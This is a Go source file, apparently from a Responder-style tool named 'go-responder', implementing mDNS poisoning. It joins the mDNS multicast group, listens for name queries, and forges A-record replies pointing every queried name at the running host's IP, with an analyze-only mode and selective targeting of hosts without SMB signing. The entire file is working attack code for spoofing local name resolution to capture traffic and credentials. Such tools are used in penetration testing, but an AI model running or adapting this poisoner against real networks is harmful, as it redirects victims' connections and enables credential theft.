package poisoner

import (
	"context"
	"encoding/binary"
	"net"
	"syscall"

	"go-responder/internal/analyzer"
	"go-responder/internal/core"
)

const mdnsMulticast = "224.0.0.251"
const mdnsPort = 5353

func PoisonMDNS(ifaceIP net.IP) {
	iface, err := IfaceByIP(ifaceIP)
	if err != nil {
		core.LogError("mDNS: no interface for %s - %v", ifaceIP, err)
		return
	}
	ip4 := ifaceIP.To4()
	if ip4 == nil {
		core.LogError("mDNS: no IPv4 address on %s", ifaceIP)
		return
	}


	lc := net.ListenConfig{
		Control: func(network, address string, c syscall.RawConn) error {
			var ctlErr error
			c.Control(func(fd uintptr) {
				mreq := &syscall.IPMreqn{
					Multiaddr: [4]byte{224, 0, 0, 251},
					Ifindex:   int32(iface.Index),
				}
				if ctlErr = syscall.SetsockoptIPMreqn(int(fd), syscall.IPPROTO_IP, syscall.IP_ADD_MEMBERSHIP, mreq); ctlErr != nil {
					return
				}

				if ctlErr = syscall.SetsockoptInet4Addr(int(fd), syscall.IPPROTO_IP, syscall.IP_MULTICAST_IF, [4]byte{ip4[0], ip4[1], ip4[2], ip4[3]}); ctlErr != nil {
					return
				}

				ctlErr = syscall.SetsockoptByte(int(fd), syscall.IPPROTO_IP, syscall.IP_MULTICAST_TTL, 255)
			})
			return ctlErr
		},
	}
	pc, err := lc.ListenPacket(context.Background(), "udp4", ":5353")
	if err != nil {
		core.LogError("mDNS: bind :5353 failed (root?) - %v", err)
		return
	}
	conn := pc.(*net.UDPConn)
	defer conn.Close()

	group := &net.UDPAddr{IP: net.ParseIP(mdnsMulticast), Port: mdnsPort}
	core.LogInfo("mDNS  listening on %s (UDP %d, multicast %s)", ifaceIP, mdnsPort, mdnsMulticast)

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}
		pkt := buf[:n]
		name := ParseLLMNRQuery(pkt)
		if name == "" {
			continue
		}
		core.LogVerbose("mDNS  query: %s from %s", name, src)
		analyzer.Global.RegisterQuery(src.IP, name)
		if core.AnalyzeMode {
			core.LogInfo("[mDNS] [Analyze] query for '%s' from %s", name, src)
			continue
		}
		if !core.ShouldRespond(src, name) {
			continue
		}
		if !analyzer.Global.ShouldPoison(src.IP) {
			core.LogVerbose("[mDNS] [Selective] skipping %s (signing=required)", src.IP)
			continue
		}
		resp := BuildMDNSResponse(pkt, ifaceIP)
		if resp != nil {

			if _, err := conn.WriteToUDP(resp, group); err != nil {
				core.LogError("[mDNS] multicast send FAILED: %v", err)
			} else {
				core.LogInfo("[mDNS] Poisoned query for '%s' - responding with %s (multicast)", name, ifaceIP)
			}
		}
	}
}


func BuildMDNSResponse(query []byte, ip net.IP) []byte {
	if len(query) < 12 {
		return nil
	}
	qStart := 12
	qEnd := qStart
	for qEnd < len(query) {
		l := int(query[qEnd])
		qEnd++
		if l == 0 {
			break
		}
		qEnd += l
	}
	if qEnd+4 > len(query) {
		return nil
	}
	qType := binary.BigEndian.Uint16(query[qEnd : qEnd+2])
	if qType != 1 { // on ne répond qu'aux requêtes A
		return nil
	}
	qEnd += 4
	question := query[qStart:qEnd]

	var resp []byte
	resp = append(resp, 0x00, 0x00)
	resp = append(resp, 0x84, 0x00)
	resp = append(resp, 0x00, 0x01)
	resp = append(resp, 0x00, 0x01)
	resp = append(resp, 0x00, 0x00)
	resp = append(resp, 0x00, 0x00)
	resp = append(resp, question...)
	resp = append(resp, 0xC0, 0x0C)
	resp = append(resp, 0x00, 0x01)
	resp = append(resp, 0x80, 0x01)
	resp = append(resp, 0x00, 0x00, 0x00, 0x78)
	resp = append(resp, 0x00, 0x04)
	resp = append(resp, ip.To4()...)
	return resp
}
